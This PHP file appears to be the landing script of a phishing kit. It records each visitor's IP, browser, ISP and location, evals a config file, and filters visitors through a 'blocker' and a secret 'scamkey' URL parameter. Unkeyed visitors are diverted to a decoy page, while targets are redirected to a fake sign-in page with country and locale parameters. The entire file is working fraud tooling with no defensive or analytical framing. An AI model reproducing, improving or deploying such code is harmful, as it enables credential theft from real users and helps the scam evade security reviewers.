<?php
include __DIR__ . '/function.php';

$api->setup();

$_SESSION['ip']       = $api->getIp();
$_SESSION['os']       = $api->getOs();
$_SESSION['agent']    = $api->getAgent();
$_SESSION['lang']     = $api->getLang();
$_SESSION['ref']      = $api->getRef();
$_SESSION['browser']  = $api->getBrowser();
$_SESSION['key']      = $api->ngerandom();
$_SESSION['host']     = $api->getHost($_SESSION['ip']);
$_SESSION['code']     = $api->dataIp($_SESSION['ip'])['code'];
$_SESSION['country']  = $api->dataIp($_SESSION['ip'])['country'];
$_SESSION['city']     = $api->dataIp($_SESSION['ip'])['city'];
$_SESSION['state']    = $api->dataIp($_SESSION['ip'])['state'];
$_SESSION['isp']      = $api->dataIp($_SESSION['ip'])['isp'];

@eval(file_get_contents($api->dir_config.'/'.$api->general_config));

if ($config_blocker == "enable") {
  $api->blocker();
  $api->create_cookie();
}

if($config_scamkey != "") {
  if(isset($_GET[$config_scamkey])) {
    $api->redirect("signin?country.x={$_SESSION['code']}&locale.x={$_SESSION['lang']}_{$_SESSION['code']}");
  } else {
    $api->blocked("Block Scamkey");
    $api->redirect("success");
  }
} else {
  $api->redirect("signin?country.x={$_SESSION['code']}&locale.x={$_SESSION['lang']}_{$_SESSION['code']}");
}
?>
